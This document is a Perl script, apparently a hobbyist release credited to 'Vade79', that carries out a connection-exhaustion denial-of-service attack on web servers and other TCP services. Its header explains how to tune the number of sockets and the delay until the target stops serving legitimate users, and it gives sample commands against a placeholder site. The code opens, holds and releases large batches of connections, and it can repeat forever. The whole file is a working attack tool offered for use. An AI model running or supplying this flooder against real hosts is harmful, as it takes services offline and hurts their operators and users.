#!/usr/bin/perl

# Simple httpd/misc. DoS idea. -> Vade79[v9@nonexistant].
#
# This is a pretty simple concept on a way to flood(DoS) httpd and other
# servcies by holding a large amount of connections to a socket/service, making
# the server become busy to normal users.
#
# Every server will probably be a little different.  You will probably have to
# play with each server to see what the delay is before the server closes idle
# connections and what the maximum number of connections the server can hold.
# A good way to test this is to notice if you are getting consistant
# connections, if you are, that means you need more sockets connecting.  You
# should start seeing connection failures close to the maximum of the sockets
# you set, that means the servers httpd has become busy.  Example:
#
# Bad and wasteful:
# # ./file.pl www.site.com 80 180 150 1
# ./file.pl: www.site.com(80): connected 150 of 150 socket(s) successfully, waiting 180s.
#
# Good and effective(well, it's actually wasteful too):
# # ./file.pl www.site.com 80 180 300 1 ...
# ./file.pl: www.site.com(80): connected 253 of 300 socket(s) successfully, waiting 180s.
# 
# This is just a thought that came occured to me.  It wouldn't be wise to go
# around flooding servers, mainly because it wouldn't be spoofed(*wink*) and
# it's retarded, but they vulnerable none the less.
#
# Note: some sites are wise to large number of connections from the same host.

use Socket;
sub sout{print "$0: @_\n";}
sub sconnect{
 my ($s,$p)=split(/ /,shift);
 if ($p<1){$p=80;}
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($s);
 $pa=sockaddr_in($p,$ia);
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 &sout("$s($p): attempting to connected $i socket(s).");
 while ($l<$i){
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 &sout("$s($p): connected $j of $l socket(s) successfully, waiting $k\s.");
 sleep($k);&sout("$s($p): done waiting, killing socket(s).");
 $l=0;
 while ($l<$i){
  $t="SOCK$l";
  shutdown($t,2)||&sout("$s($p): error shutting down socket. [$l]");
  $l++;
 }
 &sout("completed round($n), eof.");
}
$k=$ARGV[2];if (!$k){$k=1;}
$i=$ARGV[3];if (!$i){$i=1;}
$m=$ARGV[4];if (!$m){$m=1;}
$n=0;
if (!$ARGV[1]){
 print "syntax: $0 <server port> [delay, -1=forever] [number] [repetitions, -1=forever]\n";
 exit(0);
}
&sout("flood info: number of socket(s)        : $i.");
&sout("flood info: delay between repetition(s): $k.");
&sout("flood info: repetition(s)              : $m.");
while ($n<$m||$m==-1){
 &sconnect("@ARGV");
 $n++;
}
exit(0);